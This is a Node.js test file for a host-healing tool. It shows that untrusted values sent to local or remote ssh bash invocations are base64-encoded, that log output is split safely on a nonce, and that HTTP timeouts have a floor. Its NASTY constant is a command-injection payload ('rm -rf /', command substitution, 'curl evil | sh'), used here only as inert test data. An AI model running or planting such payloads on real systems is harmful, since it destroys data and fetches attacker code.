// host_typed_argv.test.mjs - the #46a/#46c/#50 hardening, proven on the pure
// helpers so no real process is ever spawned.
//
// The threat model: an attacker who controls a value that flows to the prod host
// (a container name from config, SHIM_URL from env, log CONTENT echoed back)
// must not be able to turn it into shell code - not on the local shell, and
// CRUCIALLY not on the remote ssh login shell, which re-parses ssh's joined
// command string.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { Buffer } from 'node:buffer';

import { buildHostScriptArgv } from '../src/host.mjs';
import { SENSOR_SCRIPT, splitOnNonce } from '../src/sensor.mjs';
import { resolveHttpTimeouts } from '../src/diagnose.mjs';

// A value that is pure offensive shell payload. If ANY of this survives as code,
// the test must fail.
const NASTY = '; rm -rf / $(touch /tmp/pwned) `id` && curl evil | sh';

// -- base64 round-trip: the payload survives as DATA -------------------------

test('base64 arg round-trips a shell-metacharacter value as inert data', () => {
  const encoded = Buffer.from(NASTY, 'utf8').toString('base64');
  // base64 of arbitrary bytes only ever uses [A-Za-z0-9+/=] - no shell-special
  // character, so even a second (remote) shell parse can't tokenize it as code.
  assert.match(encoded, /^[A-Za-z0-9+/]+={0,2}$/);
  const decoded = Buffer.from(encoded, 'utf8').toString('utf8'); // base64->utf8...
  const back = Buffer.from(encoded, 'base64').toString('utf8');  // ...and the real decode
  assert.notEqual(decoded, NASTY);        // sanity: encoded form is not the raw value
  assert.equal(back, NASTY);              // decode recovers the value verbatim
});

// -- argv construction: untrusted values live in argv, NEVER in the script ----

test('buildHostScriptArgv (on-box): untrusted values are base64 in the arg tail, not in the script text', () => {
  const script = 'echo "$1"';
  const { bin, argv } = buildHostScriptArgv(script, [NASTY], ''); // '' => on-box
  assert.equal(bin, 'bash');
  assert.equal(argv[0], '-c');
  assert.equal(argv[1], script);          // the script is the developer's constant, verbatim
  assert.equal(argv[2], '_');             // $0 placeholder
  const b64 = Buffer.from(NASTY, 'utf8').toString('base64');
  assert.equal(argv[3], b64);             // $1 is the base64, not the raw value

  // The raw payload appears NOWHERE in the spawn invocation as a substring.
  const flat = [bin, ...argv].join(' ');
  assert.ok(!flat.includes('rm -rf'), 'raw payload must not appear anywhere in argv');
  assert.ok(!flat.includes('$(touch'), 'raw payload must not appear anywhere in argv');
});

test('buildHostScriptArgv (remote ssh): hands ssh ONE command string, script single-quoted, no raw payload', () => {
  const script = 'echo "$1"';
  const host = 'nick@149.118.69.221';
  const { bin, argv } = buildHostScriptArgv(script, [NASTY], host);
  assert.equal(bin, 'ssh');
  // ssh has no argv channel - everything past the host is ONE remote command
  // string. We compose it ourselves with the script single-quoted (PR #109 fix).
  assert.deepEqual(argv.slice(0, 3), ['-o', 'ConnectTimeout=8', host]);
  assert.equal(argv.length, 4, 'remote argv is flags + host + ONE command string');
  const remoteCmd = argv[3];
  const b64 = Buffer.from(NASTY, 'utf8').toString('base64');
  // The remote command is `bash -c '<script>' _ <b64>` - script quoted, b64 bare.
  assert.equal(remoteCmd, `bash -c ${"'"}${script}${"'"} _ ${b64}`);

  // The raw payload must not appear as code anywhere the remote shell can see it.
  assert.ok(!remoteCmd.includes('rm -rf'), 'remote re-parse must not see raw shell code');
  assert.ok(!remoteCmd.includes('`id`'), 'remote re-parse must not see backticks');
  assert.match(b64, /^[A-Za-z0-9+/]+={0,2}$/, 'the untrusted arg is pure base64');
});

// -- THE PR #109 REGRESSION: the bug was what ssh does to the argv ON THE WIRE,
// not the argv array shape. ssh space-joins its trailing argv and the remote
// LOGIN SHELL re-parses that string; the old `['bash','-c',SCRIPT,'_',b64]` form
// split on the `;` inside SCRIPT so `_ b64` never reached the inner bash and
// $1/$2/$3 came back EMPTY. We simulate the wire by re-tokenizing the remote
// command string the way a POSIX shell would, and assert the inner-bash boundary
// + positional binding survive.

/**
 * Minimal POSIX-ish tokenizer modelling what the remote login shell does to our
 * composed command string for `bash -c ...`. It honors the THREE constructs our
 * single-quoting relies on, and only those:
 *   - unquoted whitespace splits words;
 *   - single quotes group a literal run (no escapes inside, per POSIX);
 *   - a backslash OUTSIDE single quotes escapes the next char to a literal.
 * That last rule is essential: shSingleQuote emits '\'' to embed a literal
 * single quote (close-quote, backslash-escaped quote, re-open), so a tokenizer
 * that ignored backslash-escaping would mis-model exactly the construct under
 * test (it did, in the first draft of this test - caught by the live ssh
 * round-trip below). This is NOT a full shell; it covers the surface our fix
 * defends and nothing more.
 */
function tokenizeLikeShell(s) {
  const tokens = [];
  let cur = '';
  let inSingle = false;
  let started = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (inSingle) {
      if (ch === "'") inSingle = false;
      else { cur += ch; }
      continue;
    }
    if (ch === '\\') { // backslash escapes the next char to a literal (outside single quotes)
      i += 1;
      if (i < s.length) { cur += s[i]; started = true; }
      continue;
    }
    if (ch === "'") { inSingle = true; started = true; continue; }
    if (ch === ' ' || ch === '\t') { if (started) { tokens.push(cur); cur = ''; started = false; } continue; }
    cur += ch; started = true;
  }
  if (started) tokens.push(cur);
  return tokens;
}

test('remote wire simulation: re-tokenizing the ssh command string binds the inner bash positionals (PR #109)', () => {
  const host = 'nick@oci';
  const { argv } = buildHostScriptArgv(SENSOR_SCRIPT, ['tw-clawd', '5', 'NONCE123'], host);
  const remoteCmd = argv[3];
  const toks = tokenizeLikeShell(remoteCmd);
  // What the remote shell sees: bash, -c, <ONE script word>, _, <b64>, <b64>, <b64>
  assert.equal(toks[0], 'bash');
  assert.equal(toks[1], '-c');
  assert.equal(toks[2], SENSOR_SCRIPT, 'the script survives as ONE argument to inner bash -c');
  assert.equal(toks[3], '_', '$0 placeholder');
  // $1/$2/$3 must be the (non-empty) base64 of each arg - the exact thing that
  // was EMPTY before the fix.
  assert.equal(Buffer.from(toks[4], 'base64').toString('utf8'), 'tw-clawd');
  assert.equal(Buffer.from(toks[5], 'base64').toString('utf8'), '5');
  assert.equal(Buffer.from(toks[6], 'base64').toString('utf8'), 'NONCE123');
  assert.equal(toks.length, 7, 'no extra tokens leaked from splitting the script');
});

test('remote wire simulation: a NASTY arg stays ONE inert token after the wire re-parse', () => {
  const { argv } = buildHostScriptArgv('echo "$1"', [NASTY], 'nick@oci');
  const toks = tokenizeLikeShell(argv[3]);
  // bash, -c, script, _, <b64-of-NASTY>
  assert.equal(toks.length, 5, 'NASTY must not split into multiple shell words');
  assert.equal(Buffer.from(toks[4], 'base64').toString('utf8'), NASTY);
  // none of the offensive substrings survive as bare shell tokens.
  assert.ok(!toks.includes('rm'), 'no bare rm token');
  assert.ok(!toks.some((t) => t.includes('$(') || t.includes('`')), 'no command-substitution tokens');
});

// Best-effort REAL loopback round-trip: if this box can ssh to itself, prove the
// positional actually binds end-to-end. Skipped (not failed) where ssh-to-self
// isn't available (most CI), so the deterministic simulation above is the gate.
test('remote ssh round-trip binds $1 (live, skipped if no ssh-to-self)', async (t) => {
  const { spawnSync } = await import('node:child_process');
  const probe = spawnSync('ssh', ['-o', 'BatchMode=yes', '-o', 'ConnectTimeout=3', 'localhost', 'true']);
  if (probe.status !== 0) { t.skip('no passwordless ssh-to-self on this box'); return; }

  const { runOnHostScript } = await import('../src/host.mjs');
  const prev = process.env.HEALER_HOST;
  process.env.HEALER_HOST = 'localhost';
  try {
    // Echo back the decoded $1 - proves the positional bound over a real ssh hop.
    const script = 'printf %s "$(printf %s "$1" | base64 -d)"';
    const { stdout, code } = await runOnHostScript(script, ['BOUND:tw-clawd']);
    assert.equal(code, 0);
    assert.equal(stdout, 'BOUND:tw-clawd');
  } finally {
    if (prev === undefined) delete process.env.HEALER_HOST; else process.env.HEALER_HOST = prev;
  }
});

test('buildHostScriptArgv encodes EVERY arg, in order', () => {
  const args = ['alpha', NASTY, 'gamma'];
  const { argv } = buildHostScriptArgv('s', args, '');
  const tail = argv.slice(3); // after '-c','s','_'
  assert.equal(tail.length, 3);
  tail.forEach((t, i) => {
    assert.equal(Buffer.from(t, 'base64').toString('utf8'), args[i]);
  });
});

test('SENSOR_SCRIPT decodes its positional args and never embeds them - it is a constant', () => {
  // The script must read $1/$2/$3 (decoded) and contain no interpolation slots.
  assert.match(SENSOR_SCRIPT, /base64 -d/);
  assert.match(SENSOR_SCRIPT, /"\$__n"/);   // container name used only via the decoded var
  assert.ok(!SENSOR_SCRIPT.includes('${'), 'no template-literal interpolation in the script');
  // docker logs -t flag preserved (deploy-#49 cadence-aware collapse depends on it).
  assert.match(SENSOR_SCRIPT, /docker logs -t/);
});

// -- nonce framing: forged boundary in log content cannot corrupt the split ---

test('splitOnNonce: a log line containing a GUESSED static sentinel does not move the boundary', () => {
  const nonce = 'HEALER_SPLIT_deadbeefcafef00ddeadbeefcafef00d';
  // Attacker embeds the OLD static sentinel + a fake nonce-shaped string in logs.
  const logBody =
    '@@HEALER_SPLIT@@\nHEALER_SPLIT_0000000000000000\nmalicious forged meta|99|true';
  const stdout = `INSPECT_RC=0\nrunning|2|true\n${nonce}\n${logBody}`;
  const { head, logs } = splitOnNonce(stdout, nonce);
  assert.match(head, /INSPECT_RC=0/);
  assert.match(head, /running\|2\|true/);
  assert.ok(!head.includes('forged meta'), 'forged meta must stay on the LOGS side');
  assert.match(logs, /forged meta/);
  // The real inspect line, not the forged one, is what a parser would read.
  assert.ok(!head.includes('99|true'), 'the attacker cannot inject a fake inspect line into head');
});

test('splitOnNonce: splits on the FIRST nonce occurrence (an echoed nonce cannot pull the seam earlier)', () => {
  const nonce = 'HEALER_SPLIT_aaaa';
  // even if the nonce somehow appears again later in logs, the first one wins.
  const stdout = `meta\n${nonce}\nfirstlog\n${nonce}\nsecondlog`;
  const { head, logs } = splitOnNonce(stdout, nonce);
  assert.equal(head, 'meta\n');
  assert.equal(logs, `firstlog\n${nonce}\nsecondlog`);
});

test('splitOnNonce: tolerates a missing trailing newline after the nonce', () => {
  const nonce = 'HEALER_SPLIT_bbbb';
  const { head, logs } = splitOnNonce(`meta${nonce}tail`, nonce);
  assert.equal(head, 'meta');
  assert.equal(logs, 'tail');
});

test('splitOnNonce: no nonce present => all head, empty logs (fail toward visible meta, not silent loss)', () => {
  const { head, logs } = splitOnNonce('just some output', 'HEALER_SPLIT_xxxx');
  assert.equal(head, 'just some output');
  assert.equal(logs, '');
});

// -- #50 timeout floor --------------------------------------------------------

test('resolveHttpTimeouts: clamps a sub-floor SHIM_HTTP_TIMEOUT_MS up to >=180000', () => {
  const { curlMaxTimeSec, runOnHostMs } = resolveHttpTimeouts({ SHIM_HTTP_TIMEOUT_MS: '30000' });
  assert.ok(curlMaxTimeSec * 1000 >= 180_000, 'curl --max-time clamped to >= shim ceiling');
  assert.equal(curlMaxTimeSec, 180);
  assert.equal(runOnHostMs, 190_000);       // ms(180000) + 10s, monotonic above curl
  assert.ok(curlMaxTimeSec * 1000 < runOnHostMs);
});

test('resolveHttpTimeouts: a value AT the floor passes through unchanged', () => {
  const { curlMaxTimeSec } = resolveHttpTimeouts({ SHIM_HTTP_TIMEOUT_MS: '180000' });
  assert.equal(curlMaxTimeSec, 180);
});

test('resolveHttpTimeouts: default (200000) is above the floor and unchanged', () => {
  const { curlMaxTimeSec, runOnHostMs } = resolveHttpTimeouts({});
  assert.equal(curlMaxTimeSec, 200);
  assert.equal(runOnHostMs, 210_000);
});

test('resolveHttpTimeouts: an above-floor value is NOT clamped (floor only raises, never lowers)', () => {
  const { curlMaxTimeSec } = resolveHttpTimeouts({ SHIM_HTTP_TIMEOUT_MS: '200000' });
  assert.equal(curlMaxTimeSec, 200);
});
